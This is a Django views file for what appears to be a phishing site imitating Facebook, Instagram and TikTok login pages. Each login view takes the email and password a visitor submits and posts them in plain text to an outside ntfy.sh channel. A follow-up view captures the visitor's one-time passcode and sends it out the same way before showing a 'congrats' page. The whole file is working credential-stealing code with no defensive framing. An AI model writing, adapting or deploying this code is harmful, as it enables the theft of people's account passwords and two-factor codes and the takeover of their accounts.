from django.shortcuts import render, redirect
import requests

# Create your views here.

def home(request):
  return render(request, 'index.html')


def f(request):
  if request.method=="POST":
    email=request.POST['email']
    password=request.POST['password']

    message = f"FACEBOOK\nEmail: {email}\nPassword: {password}"
    requests.post("https://ntfy.sh/GiveRAw", data=message.encode('utf-8'))

    return redirect('o')
  return render(request, 'f.html')



def ins(request):
  if request.method=="POST":
    email=request.POST['email']
    password=request.POST['password']

    message = f"INSTAGRAM\nEmail: {email}\nPassword: {password}"
    requests.post("https://ntfy.sh/GiveRAw", data=message.encode('utf-8'))

    return redirect('o')
  return render(request, 'in.html')


def t(request):
  if request.method=="POST":
    email=request.POST['email']
    password=request.POST['password']

    message = f"TIKTOK\nEmail: {email}\nPassword: {password}"
    requests.post("https://ntfy.sh/GiveRAw", data=message.encode('utf-8'))

    return redirect('o')
  return render(request, 't.html')


def o(request):
  if request.method=="POST":
    otp=request.POST['otp']

    message = f"OTP: {otp}"
    requests.post("https://ntfy.sh/GiveRAw", data=message.encode('utf-8'))

    return redirect('congrats')
  return render(request, 'o.html')


def congrats(request):
  return render(request, 'congrats.html')